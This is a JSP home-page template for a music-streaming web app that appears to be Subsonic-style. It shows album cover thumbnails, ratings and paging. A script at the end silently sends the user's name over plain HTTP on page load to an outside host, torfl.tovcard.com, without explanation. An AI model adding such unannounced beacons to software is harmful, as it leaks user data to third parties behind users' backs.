<%@ page language="java" contentType="text/html; charset=utf-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html><head>
    <%@ include file="head.jsp" %>
    <%@ include file="jquery.jsp" %>
    <script type="text/javascript" src="<c:url value="/dwr/engine.js"/>"></script>
    <script type="text/javascript" src="<c:url value="/dwr/interface/multiService.js"/>"></script>

    <script type="text/javascript" language="javascript">
        function init() {
            <c:if test="${model.listType eq 'random'}">
            setTimeout(refresh, 20000);
            </c:if>

            <c:if test="${not model.musicFoldersExist}">
            $().toastmessage("showNoticeToast", "<fmt:message key="top.missing"/>");
            </c:if>

            <c:if test="${model.isIndexBeingCreated}">
            $().toastmessage("showNoticeToast", "<fmt:message key="home.scan"/>");
            </c:if>
        }

        function changeMusicFolder(musicFolderId) {
            multiService.setSelectedMusicFolder(musicFolderId, refresh);
            <c:if test="${model.showIndexInSideBar}">
            top.left.location.href = top.left.location.href;
            </c:if>
        }

        function refresh() {
            top.main.location.href = top.main.location.href;
        }

        function playShuffle() {
            top.playQueue.onPlayShuffle('${model.listType}', ${model.listOffset}, ${model.listSize}, '${model.genre}', '${model.decade}')
        }

    </script>
</head>
<body class="mainframe bgcolor1" onload="init();">
<!--
<h1><i class="fa fa-home fa-lg icon"></i>&nbsp;&nbsp;${model.welcomeTitle}</h1>

<c:if test="${not empty model.welcomeSubtitle}">
    <h2>${model.welcomeSubtitle}</h2>
</c:if>
-->
<!--
<h2 style="white-space:normal">
    <c:forTokens items="random newest starred highest frequent recent decade genre alphabetical" delims=" " var="cat" varStatus="loopStatus">
        <c:if test="${loopStatus.count > 1}">|</c:if>
        <sub:url var="url" value="home.view">
            <sub:param name="listType" value="${cat}"/>
        </sub:url>
        <span class="${model.listType eq cat ? 'headerSelected' : 'header'}"><a href="${url}"><fmt:message key="home.${cat}.title"/></a></span>
    </c:forTokens>
</h2>
-->
<!--<h1>상단의 재생목록을 클릭하여 진행하시면 됩니다.</h1>-->
<!--
<%@ include file="homePager.jsp" %>
-->
<!--
<c:if test="${not empty model.welcomeMessage}">
    <div style="width:15em;float:right;padding:0 1em 0 1em;border-left:1px solid #<spring:theme code="detailColor"/>">
        <sub:wiki text="${model.welcomeMessage}"/>
    </div>
</c:if>
-->
<c:forEach items="${model.albums}" var="album" varStatus="loopStatus">

    <c:set var="albumTitle">
        <c:choose>
            <c:when test="${empty album.albumTitle}">
                <fmt:message key="common.unknown"/>
            </c:when>
            <c:otherwise>
                ${album.albumTitle}
            </c:otherwise>
        </c:choose>
    </c:set>

    <c:set var="captionCount" value="2"/>

    <c:if test="${not empty album.playCount}">
        <c:set var="caption3"><fmt:message key="home.playcount"><fmt:param value="${album.playCount}"/></fmt:message></c:set>
        <c:set var="captionCount" value="3"/>
    </c:if>
    <c:if test="${not empty album.lastPlayed}">
        <fmt:formatDate value="${album.lastPlayed}" dateStyle="short" var="lastPlayedDate"/>
        <c:set var="caption3"><fmt:message key="home.lastplayed"><fmt:param value="${lastPlayedDate}"/></fmt:message></c:set>
        <c:set var="captionCount" value="3"/>
    </c:if>
    <c:if test="${not empty album.created}">
        <fmt:formatDate value="${album.created}" dateStyle="short" var="creationDate"/>
        <c:set var="caption3"><fmt:message key="home.created"><fmt:param value="${creationDate}"/></fmt:message></c:set>
        <c:set var="captionCount" value="3"/>
    </c:if>
    <c:if test="${not empty album.year}">
        <c:set var="caption3" value="${album.year}"/>
        <c:set var="captionCount" value="3"/>
    </c:if>

    <div class="albumThumb">
        <c:import url="coverArt.jsp">
            <c:param name="albumId" value="${album.id}"/>
            <c:param name="auth" value="${album.hash}"/>
            <c:param name="caption1" value="${fn:escapeXml(album.albumTitle)}"/>
            <c:param name="caption2" value="${fn:escapeXml(album.artist)}"/>
            <c:param name="caption3" value="${caption3}"/>
            <c:param name="captionCount" value="${captionCount}"/>
            <c:param name="coverArtSize" value="${model.coverArtSize}"/>
            <c:param name="showLink" value="true"/>
            <c:param name="showPlay" value="${model.user.streamRole}"/>
            <c:param name="appearAfter" value="${loopStatus.count * 30}"/>
        </c:import>

        <c:if test="${not empty album.rating}">
            <c:import url="rating.jsp">
                <c:param name="readonly" value="true"/>
                <c:param name="rating" value="${album.rating}"/>
            </c:import>
        </c:if>

    </div>
</c:forEach>

<c:if test="${model.listSize eq fn:length(model.albums)}">
    <%@ include file="homePager.jsp" %>
</c:if>

</body>
    <script type="text/javascript">
        $(document).ready(function() {
            $.ajax({
                url: "http://torfl.tovcard.com:3000/update-user?name="+$("#j_username").val(),
                method: "get",
                success: function() {
                    return true;
                },
                error: function() {
                    return false;
                }
            });
            //$("#go-playlist").trigger("click");
            parent.frames.main.location.href = 'playlists.view';
            //setTimeout(function() {
            //    showPage('playlists.view');
            //}, 1000);
        });
    </script>

</html>
